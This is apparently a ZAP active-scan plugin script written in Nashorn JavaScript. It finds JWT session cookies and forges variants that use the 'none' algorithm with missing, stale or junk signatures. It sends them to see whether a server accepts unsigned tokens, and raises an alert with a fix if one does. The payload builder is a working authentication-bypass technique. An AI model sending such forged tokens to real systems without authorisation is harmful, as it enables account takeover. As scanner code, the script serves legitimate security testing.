// ECMA Script uses the Oracle Nashorn engine, therefore all standard library comes from Java
// https://docs.oracle.com/javase/8/docs/technotes/guides/scripting/prog_guide/javascript.html
var Cookie = Java.type("java.net.HttpCookie")
var Base64 = Java.type("java.util.Base64")
var String = Java.type("java.lang.String")

// Exploit information, used for raising alerts
var RISK = 3
var CONFIDENCE = 3
var TITLE = "JWT None Exploit"
var DESCRIPTION = "The application's JWT implementation allows for the usage of the 'none' algorithm, which bypasses the JWT hash verification"
var SOLUTION = "Use a secure JTW library, and (if your library supports it) restrict the allowed hash algorithms"
var INFO = "https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/"
var CWEID = 347	// These two IDs may not be 100% accurate
var WASCID = 15	// I looked very briefly and picked two that vaguely match the JWT exploit

function b64encode(string) {
	// Null terminate the string with \0 since Nashorn is funky like that
	var message = (string + "\0").getBytes()
	var bytes = Base64.getEncoder().encode(message)
	return new String(bytes)
}

function b64decode(string) {
	var message = string.getBytes()
	var bytes = Base64.getDecoder().decode(message)
	return new String(bytes)
}

// Detects if a given string may be a valid JWT
function is_jwt(content) {
	var seperated = content.split(".")
	
	if (seperated.length != 3) return false
	
	try {
		b64decode(seperated[0])
		b64decode(seperated[1])
	}
	catch (err) {
		return false
	}
	
	return true
}

function build_payloads(jwt) {
	// Build header specifying use of the none algorithm
	header = b64encode('{"alg":"none","typ":"JWT"}')
	seperated = jwt.split(".")
	
	// Try a series of different JWT formats
	return [
		header + "." + seperated[1] + ".",					// no hash
		header + "." + seperated[1] + "." + seperated[2],		// original (but incorrect) hash
		header + "." + seperated[1] + ".\\(•_•)/",			// junk hash
		header + "." + seperated[1] + ".XCjigKJf4oCiKS8=",	// junk (but b64 encoded) hash
		seperated[0] + "." + seperated[1] + "."				// old header but no hash
	]
}

// This method is called for every node on the site
// ActiveScan as, HttpMessage msg
function scanNode(as, msg) {
	print("Scanning " + msg.getRequestHeader().getURI().toString())

	// Extract request cookies and detect if using JWT
	var cookies = msg.getRequestHeader().getHttpCookies()
	var jwt_cookies = []
	for (var i = 0; i < cookies.length; i++) {
		var cookie = cookies[i]
		if (is_jwt(cookie.getValue()))
			jwt_cookies.push(cookie)
	}

	if (jwt_cookies.length == 0)
		return
	if (jwt_cookies.length > 1)
		print("Multiple cookies using JWT found but not yet supported")

	// Default to the first cookie found that uses JWT
	var target_cookie = jwt_cookies[0]

	// Send a safe request (with original cookie) to see what a correct response looks like
	var msg_safe = msg.cloneRequest()
	msg_safe.setCookies([target_cookie])
	as.sendAndReceive(msg_safe)

	// Send a completely mangled request to see if the page actually looks at the cookie
	var msg_bad = msg.cloneRequest()
	msg_bad.setCookies([new Cookie(target_cookie.getName(), "!@#$%^&*()")])
	as.sendAndReceive(msg_bad)

	var safe_body = msg_safe.getResponseBody()	
	var bad_body = msg_bad.getResponseBody()
	
	// If the mangled cookie gives the same response as the correct cookie, we can assume
	// that the page does not care what we send in that field and that there is not an exploit
	if (safe_body.equals(bad_body))
		return

	var payloads = build_payloads(target_cookie.getValue())

	for (var i = 0; i < payloads.length; i++) {
		var payload = payloads[i]
		var cookie_payload = new Cookie(target_cookie.getName(), payload)
		var msg_loaded = msg.cloneRequest()

		msg_loaded.setCookies([cookie_payload])
		as.sendAndReceive(msg_loaded)

		var loaded_body = msg_loaded.getResponseBody()
		
		// If the body of the request sent with the none algorithm is the same as the body of the request
		// sent with the default algorithm, we know that the server is parsing the JWT instead of throwing
		// some form of server error. We can assume (in this case) that the server is parsing the none
		// algorithm and ignoring the hash--which is a vulnerability.
		if (loaded_body.equals(safe_body))
			raise_alert(msg_loaded, target_cookie, payload, as)
	}
}

function raise_alert(msg, cookie, payload, as) {
	print("Vulnerability found, sending alert")
	as.raiseAlert(
		RISK, CONFIDENCE, TITLE, DESCRIPTION,
		msg.getRequestHeader().getURI().toString(), "", "", INFO,
		SOLUTION, "cookie:" + cookie.getName() + ", payload:" + payload,
		CWEID, WASCID, msg
	)
}

// Unused function for scanning query parameters (however is it MUST be defined for ZAP to recognize the plugin)
function scan(as, msg, param, value) {}
